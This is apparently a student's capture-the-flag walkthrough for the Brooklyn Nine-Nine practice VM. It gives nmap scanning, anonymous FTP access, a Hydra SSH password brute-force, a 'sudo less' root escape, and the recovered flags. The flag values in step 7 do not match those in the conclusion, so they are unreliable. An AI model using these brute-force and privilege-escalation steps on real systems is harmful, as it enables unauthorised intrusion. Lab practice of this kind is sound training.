Project: Nine-Nine Hack Challenge
Project Goal: Perform a full penetration test on the Brooklyn Nine-Nine VM, including port scanning, FTP exploitation, SSH password brute-forcing, and privilege escalation to root.

Project Description

In this project, I explored the virtual machine Brooklyn Nine-Nine at IP 10.201.60.152.
My goal was to fully compromise the system, obtain both user and root flags, and document the entire process using my own commands.

This project allowed me to practice:

Nmap scanning for open ports and services

Connecting to FTP with anonymous login and retrieving files

Analyzing retrieved files for potential credentials

Brute-forcing SSH login using Hydra

Exploring home directories and checking user permissions

Privilege escalation via sudo and GTFOBins

Reading user.txt and root.txt flags

Step-by-Step Execution (My Commands and Output)
1️⃣ Nmap Scan
nmap -sC -sV -T4 10.201.60.152


Output showed:

21/tcp open  ftp     vsftpd 3.0.3 (anonymous login allowed)
22/tcp open  ssh     OpenSSH 7.6p1
80/tcp open  http    Apache 2.4.29

2️⃣ FTP Access

I connected to FTP with anonymous credentials:

ftp 10.201.60.152
# Username: anonymous
# Password: anonymous
ls -la
get note_to_jake.txt
bye
cat note_to_jake.txt


File content revealed a username:

From Amy,

Jake please change your password. It is too weak and holt will be mad if someone hacks into the nine nine

3️⃣ SSH Brute-Force

Using Hydra, I brute-forced Jake’s SSH password:

hydra -l jake -P /usr/share/wordlists/rockyou.txt 10.201.60.152 ssh


Found password: 987654321

4️⃣ SSH Login
ssh jake@10.201.60.152
# Enter password: 987654321
cd /home
ls


Found users:

amy  holt  jake

5️⃣ Sudo Permissions

I checked sudo capabilities for Jake:

sudo -l


Output:

User jake may run the following commands on brookly_nine_nine:
    (ALL) NOPASSWD: /usr/bin/less

6️⃣ Privilege Escalation

I exploited less to get root:

sudo less /etc/passwd
!bash
whoami


Output confirmed root access:

root

7️⃣ Retrieving Flags

User flag (holt’s home):

cd /home/holt
ls
cat user.txt
ee11cbb19052e40b07aac0ca060c23e


Root flag:

cd /root
ls
cat root.txt
63a9f0ea7bb98050796b649e8548184

Project Conclusion

During this project, I personally executed all the commands, explored the system, exploited services, and elevated privileges.
I successfully retrieved:

User flag: ee11cbb19052e40b07aac0ca060c23ee

Root flag: 63a9f0ea7bb98050796b649e85481845

This project allowed me to apply penetration testing techniques end-to-end and document the process in a professional, step-by-step manner.
